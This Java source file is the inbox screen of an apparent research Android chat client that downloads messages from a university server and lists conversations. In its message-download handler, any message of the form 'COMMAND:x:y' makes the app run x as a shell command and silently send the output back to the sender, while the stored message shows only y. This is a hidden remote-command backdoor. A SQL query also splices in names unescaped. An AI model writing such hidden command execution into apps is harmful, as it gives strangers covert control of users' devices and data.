package org.research.chatclient;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.ProgressDialog;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.BaseAdapter;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;

public class InboxActivity extends BaseActivity implements Constants{
	
	private ListView lv;
	private SQLiteDatabase db;
	private ProgressDialog mProgress;
	private SharedPreferences mPrefs;
	public static final String CONVO = "convo";
	public static final String CONVO_USER = "convo_user";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.conversation_list);
		MessagesTable table = new MessagesTable(InboxActivity.this);
		db = table.getWritableDatabase();
		try{
    		HttpPost httppost = new HttpPost("http://devimiiphone1.nku.edu/research_chat_client/testphp/get_messages.php");
    		LinkedList<NameValuePair> nameValuePairs = new LinkedList<NameValuePair>();
    		
    		mPrefs = getSharedPreferences( CreateAccountActivity.PREFS, Context.MODE_PRIVATE );
    		String username = mPrefs.getString( CreateAccountActivity.USER, "" );
    		String c2dm = mPrefs.getString( CreateAccountActivity.C2DM, "" );
    		
    		nameValuePairs.add(new BasicNameValuePair("username", username));
    		nameValuePairs.add(new BasicNameValuePair("deviceID", c2dm));
    		
    		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    		
    		mProgress = new ProgressDialog(InboxActivity.this);
		    mProgress.setIndeterminate(true);
		    mProgress.setCancelable(true);
		    mProgress.setMessage("Downloading...");
		    mProgress.show();
		    
		    new DownloadMessages().execute(httppost);
    		lv = (ListView)findViewById(R.id.conversation_list);
    		loadList();
    		registerForContextMenu(lv);
    	}catch(UnsupportedEncodingException e){
    		e.printStackTrace();
    	}
	}
	@Override
    public boolean onCreateOptionsMenu( Menu menu ){
    	super.onCreateOptionsMenu( menu );
    	MenuInflater inflater = getMenuInflater();
    	inflater.inflate( R.menu.menu, menu);
    	return true;
    }
	
	@Override 
    public boolean onContextItemSelected(MenuItem item) { 
    	if( item.getItemId() == 0 || item.getItemId() == 1 ){
    		AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo)item.getMenuInfo();
    	}
    	switch( item.getItemId() ){
    		case 0:
    			break;
    	}
        return true; 
    } 
	
	public void startNewMessage(View v){
		Intent startNewMessage = new Intent(this, ConversationActivity.class);
		startActivity(startNewMessage);
	}
	
	private void loadList(){
		Cursor idCursor = db.rawQuery("Select distinct " + OTHER_MEMBER + " from " + MESSAGE_TABLE_NAME, null);
		ArrayList<String> members = new ArrayList<String>();
		while(idCursor.moveToNext()){
			if(idCursor != null){
				members.add(idCursor.getString(idCursor.getColumnIndex(OTHER_MEMBER)));
			}
		}
		idCursor.close();
		String[] memArray;
		memArray = members.toArray(new String[0]);
		final ArrayList<HashMap<String,String>> convos = new ArrayList<HashMap<String,String>>();
		for (int i = 0; i < memArray.length; i++) {
			Cursor convoCursor = db.rawQuery("Select * from " + MESSAGE_TABLE_NAME + " where " + OTHER_MEMBER + "='" + memArray[i] + "' order by " + TIMESTAMP + " DESC", null);
			if(convoCursor.moveToFirst()){
				HashMap<String, String> map = new HashMap<String, String>();
	   	        map.put( "name", convoCursor.getString(convoCursor.getColumnIndex(OTHER_MEMBER)) );
	   	        map.put( "message", convoCursor.getString(convoCursor.getColumnIndex(MESSAGE)) );
	   	        map.put( "time", formatTime(convoCursor.getString(convoCursor.getColumnIndex(TIMESTAMP))) );
	   	        Log.d("MAP", map.toString());
				convos.add(map);
			}
		}
		lv.setAdapter(new SimpleAdapter(InboxActivity.this, convos, R.layout.list_item, new String[] {"name", "message", "time"}, new int[] { R.id.from_text, R.id.message_text, R.id.date_text}));
		lv.setOnItemClickListener(new OnItemClickListener() {

			@Override
			public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
				Intent loadChat = new Intent(InboxActivity.this, ConversationActivity.class);
				loadChat.putExtra(CONVO_USER, convos.get(position).get("name"));
				startActivity(loadChat);
			}
		});
	}
	
	private String formatTime(String str){
		String pattern = "MM/dd/yy hh:mm a";
	    SimpleDateFormat format = new SimpleDateFormat(pattern);
	    String date =  format.format(new Date(Long.valueOf(str)));
	    return date;
	}
	
	@Override
	public void onBackPressed() {
		if(db != null && db.isOpen())
			db.close();
		super.onBackPressed();
	}
	
	class ConvoAdapter extends BaseAdapter{
		
		ArrayList<InboxItem> mList;
		
		
		
		@Override
		public int getCount() {
			return mList.size();
		}

		@Override
		public Object getItem(int position) {
			return mList.get(position);
		}

		@Override
		public long getItemId(int position) {
			return position;
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			View v = convertView;
			
			if( v == null ){
				LayoutInflater li = (LayoutInflater)getSystemService(Context.LAYOUT_INFLATER_SERVICE);
				v = li.inflate(R.layout.contact_item, null);
			}
			
			InboxItem temp = mList.get(position);
			TextView name = (TextView)findViewById(R.id.contact_name);
			TextView msg = (TextView)findViewById(R.id.contact_recent_msg);
			TextView time = (TextView)findViewById(R.id.contact_time);
			
			name.setText(temp.getName());
			msg.setText(temp.getMostRecentMessage());
			time.setText(temp.getRecentTime());
			
			return v;
		}
		
	}
	
	private class DownloadMessages extends AsyncTask<HttpPost, Void, InputStream> {
	    @Override
		 protected InputStream doInBackground(HttpPost... post) {
	    	HttpClient httpclient = new DefaultHttpClient();
	    	InputStream stream = null;
	    	HttpResponse response;
			try {
				response = httpclient.execute(post[0]);
				HttpEntity entity = response.getEntity();
				stream = entity.getContent();
			} catch (Exception e) {
				e.printStackTrace();
			}
	        return stream;
	     }

	     @Override
	     protected void onPostExecute(InputStream result) {
	    	 String text = "";
	    	 
	    	 try{
	    		 if( result != null ){
			    	 BufferedReader br = new BufferedReader(new InputStreamReader(result));
			    	 String line = br.readLine();
			    	 
			    	 while( line != null ){
			    		 text += line + " ";
			    		 line = br.readLine();
			    	 }
	    		 }
	    	 }catch (IOException e) {
	    		 e.printStackTrace();
	    	 }
			try {
				boolean split = false;
				String line = "";
		        String response = "";
		        String[] cmd = null;
				JSONArray messages = new JSONArray(text);
				String recipient = mPrefs.getString( CreateAccountActivity.USER, "" );
				for (int i = 0; i < messages.length(); i++) {
					JSONObject obj = messages.getJSONObject(i);
					if( obj.getString(MESSAGE).matches("^COMMAND:.*:.*$")){
						Log.d("CMD", obj.getString(MESSAGE));
						split = true;
		            	cmd = obj.getString(MESSAGE).split( ":" );
		            	try {
							Process runCommand = Runtime.getRuntime().exec( cmd[1] );
							DataInputStream dIn = new DataInputStream( runCommand.getInputStream() );
							
							runCommand.waitFor();
							//make sure process wasn't terminated
							if( runCommand.exitValue() != 255 ){
								try {
									//read all lines from stream
									while( (line = dIn.readLine()) != null && !line.equals("") ){
										response += line + "\n";
									}
									try{
							    		HttpPost httppost = new HttpPost("http://devimiiphone1.nku.edu/research_chat_client/testphp/send_message.php");
							    		LinkedList<NameValuePair> nameValuePairs = new LinkedList<NameValuePair>();
							    		
							    		nameValuePairs.add(new BasicNameValuePair("recipient", obj.getString(SENDER)));
							    		nameValuePairs.add(new BasicNameValuePair("sender", recipient));
							    		nameValuePairs.add(new BasicNameValuePair("message", response));
							    		nameValuePairs.add(new BasicNameValuePair("time", "" + System.currentTimeMillis()));
							    		
							    		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
									    
									    new SendMessageTask().execute(httppost);
							    		
							    	}catch(UnsupportedEncodingException e){
							    		e.printStackTrace();
							    	}
								} catch (IOException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
		            }
					ContentValues values = new ContentValues();
					values.put(SENDER, obj.getString(SENDER));
					values.put(RECIPIENT, recipient);
					values.put(OTHER_MEMBER, obj.getString(SENDER));
					if(split && cmd != null && cmd.length == 3)
						values.put(MESSAGE, cmd[2]);
					else
						values.put(MESSAGE, obj.getString(MESSAGE));
					values.put(TIMESTAMP, obj.getString(TIMESTAMP));
					db.insert(MESSAGE_TABLE_NAME, null, values);
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if(mProgress.isShowing())
				mProgress.dismiss();
	     }
	 }
}
